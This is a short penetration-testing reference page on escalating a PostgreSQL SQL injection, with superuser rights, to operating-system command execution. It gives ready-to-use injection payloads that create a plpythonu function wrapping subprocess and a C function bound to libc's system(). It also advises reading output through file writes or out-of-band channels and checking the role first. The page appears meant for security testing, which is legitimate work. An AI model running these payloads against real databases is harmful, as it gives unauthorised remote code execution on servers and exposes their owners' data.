---
title: "PostgreSQL command execution via untrusted-language functions"
description: "Defining a function in plpythonu, plperlu, or C from a superuser PostgreSQL injection to run OS commands when COPY FROM PROGRAM is not available."
keywords:
  - plpythonu
  - plperlu
  - CREATE FUNCTION
  - libc system
  - PostgreSQL RCE
---

# Untrusted language function

When `COPY ... FROM PROGRAM` is blocked but the role is a superuser, defining a function in an untrusted language gives command execution. Untrusted languages (`plpythonu`, `plperlu`, and C) run with no sandbox, so their functions can call out to the operating system. Creating them requires a superuser.

With an untrusted procedural language installed, wrap a subprocess call. The function is defined and called through stacked statements:

```sql
'; CREATE OR REPLACE FUNCTION exec(cmd text) RETURNS text AS $$ import subprocess; return subprocess.check_output(cmd, shell=True).decode() $$ LANGUAGE plpythonu-- 
' UNION SELECT exec('id'),NULL,NULL-- 
```

`plperlu` is equivalent where Perl is the installed language. When no procedural language is available, C still works by binding to a libc symbol directly, which needs only the shared library on disk:

```sql
'; CREATE FUNCTION sys(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6','system' LANGUAGE c STRICT-- 
' UNION SELECT sys('id > /tmp/o')::text,NULL,NULL-- 
```

The C `system` binding runs the command but returns only an exit status, so it is paired with a file write or an out-of-band channel to read output. All of these run as the PostgreSQL process account. Because every variant needs superuser, enumerate the role first; against a non-superuser, `COPY ... FROM PROGRAM` through the `pg_execute_server_program` role is the only command route.

## References

- PostgreSQL Documentation: CREATE FUNCTION, procedural languages, C-language functions
- OWASP Testing Guide: Testing for SQL Injection
